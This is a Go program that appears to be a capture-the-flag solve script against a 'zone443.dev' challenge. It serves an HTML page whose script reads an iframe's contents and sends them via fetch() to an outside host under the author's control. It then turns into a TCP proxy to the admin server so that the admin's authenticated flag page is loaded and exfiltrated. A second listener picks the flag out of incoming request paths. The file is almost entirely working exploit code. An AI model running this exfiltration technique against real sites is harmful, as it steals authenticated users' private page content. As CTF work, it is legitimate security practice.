// Based on starter code in example.go

package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"

	"github.com/inetaf/tcpproxy"
)

// port to listen for initial request and proxy to admin.zone443.dev
const port = 443

// port to retrieve exfil
const port2 = 80

// channel to stop server after first request
var stop = make(chan bool)

// regex to detect flag
var flagRegex = regexp.MustCompile("CTF{[^{}]*}")

// store flag when found
var flag string

// getRespBody returns a plain text string to be returned in the body of the HTTP response.
func getRespBody(req *http.Request) string {
	if req.TLS == nil {
		// It's unclear if this can ever happen.
		return "Error, there was no TLS.\n"
	}

	if len(req.TLS.PeerCertificates) == 0 {
		return "You are not logged in.\n"
	}

	// If there are multiple certificates, just take the first one, which is the leaf.
	// This is not expected to ever happen because we don't issue intermediate CA certs.
	user := req.TLS.PeerCertificates[0].Subject.CommonName

	if user == "" {
		// This should never happen, we don't issue certs with empty usernames.
		return "Error the username was empty.\n"
	}

	// payload
	// iframe makes request to this server, but this request will be proxied to admin.zone443.dev
	// when iframe loads successfully (flag retrieved by admin), call load() to exfil
	log.Printf("Client authenticated as %s", user)
	return "<html>" +
		"<body>" +
		"<script>" +
		`function load(frame) {
                var exfil = encodeURI(window.frames[0].document.body.innerHTML)
                fetch('https://l3otest.zone443.dev:80/loaded-'+exfil) 
            };` +
		"</script>" +
		"Hello, " + user + ".\n" +
		"<iframe src='/' id='flag' title='Test Panel' onload=\"load('this')\"></iframe>\n" +
		"</body>" +
		"</html>"
}

// serveHTTP is the top level HTTP handler function.
func serveHTTP(resp http.ResponseWriter, req *http.Request) {
	log.Printf("Got request from %v", req.RemoteAddr)

	if req.URL.Path != "/" {
		// flag printed here
		log.Print("Bad path: " + strings.Replace(req.URL.Path, "\n", `\n`, -1))
		if flag = flagRegex.FindString(req.URL.Path); len(flag) > 0 {
			stop <- true
		}
		http.NotFound(resp, req)
		return
	}

	body := getRespBody(req)
	resp.Header().Set("Content-Type", "text/html; charset=utf-8")
	resp.Header().Set("Content-Length", strconv.Itoa(len(body)))
	resp.WriteHeader(http.StatusOK)
	resp.Write([]byte(body))
	log.Print("Done sending payload")

	// first request retrieved, stop server and switch to proxy
	log.Print("Sending stop signal to server")
	stop <- true
}

// clientCAPool consructs a CertPool containing the client CA.
func clientCAPool() (*x509.CertPool, error) {
	caCertPem, err := ioutil.ReadFile("certs/clientca.crt.pem")
	if err != nil {
		return nil, fmt.Errorf("error reading clientca cert: %v", err)
	}
	caCertBlock, rest := pem.Decode(caCertPem)
	if caCertBlock == nil || len(rest) > 0 {
		return nil, fmt.Errorf("error decoding clientca cert PEM block. caCertBlock: %v, len(rest): %d", caCertBlock, len(rest))
	}
	if caCertBlock.Type != "CERTIFICATE" {
		return nil, fmt.Errorf("clientca cert had a bad type: %s", caCertBlock.Type)
	}
	caCert, err := x509.ParseCertificate(caCertBlock.Bytes)
	if err != nil {
		return nil, fmt.Errorf("error parsing clientca cert ASN.1 DER: %v", err)
	}

	cas := x509.NewCertPool()
	cas.AddCert(caCert)
	return cas, nil
}

// serve logs and calls ListenAndServeTLS() with proper certs
func serve(s *http.Server) {
	log.Printf("About to listen on %s", s.Addr)
	err := s.ListenAndServeTLS("certs/fullchain.pem", "certs/privkey.pem")
	log.Printf("Serving on %s is over: %v", s.Addr, err)
}

func main() {
	clientCAPool, err := clientCAPool()
	if err != nil {
		log.Fatalf("Failed to create client CA pool: %v", err)
	}

	// server on first port, serve page with iframe
	s := http.Server{
		Addr: fmt.Sprintf(":%d", port),
		TLSConfig: &tls.Config{
			ClientAuth: tls.VerifyClientCertIfGiven,
			ClientCAs:  clientCAPool,
		},
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 14,
	}

	// server on second port, get flag from admin
	s2 := http.Server{
		Addr: fmt.Sprintf(":%d", port2),
	}

	http.HandleFunc("/", serveHTTP)

	// listen for request channel to be filled
	// stop first server upon first request
	go func() {
		<-stop
		s.Shutdown(context.Background())
	}()

	// start serving on first port
	serve(&s)

	// proxy 443 traffic to admin (requested by admin because of iframe)
	go func() {
		var p tcpproxy.Proxy
		addr := fmt.Sprintf(":%d", port)
		p.AddRoute(addr, tcpproxy.To("admin.zone443.dev:443"))
		log.Print("Starting proxy on " + addr)
		p.Run()
	}()

	// listen for request channel to be filled
	// stop second server upon finding flag
	go func() {
		<-stop
		s2.Shutdown(context.Background())
	}()

	// start serving on second port
	// request will have invalid path that contains flag
	serve(&s2)

	fmt.Printf("\nFlag: %s\n", flag)
}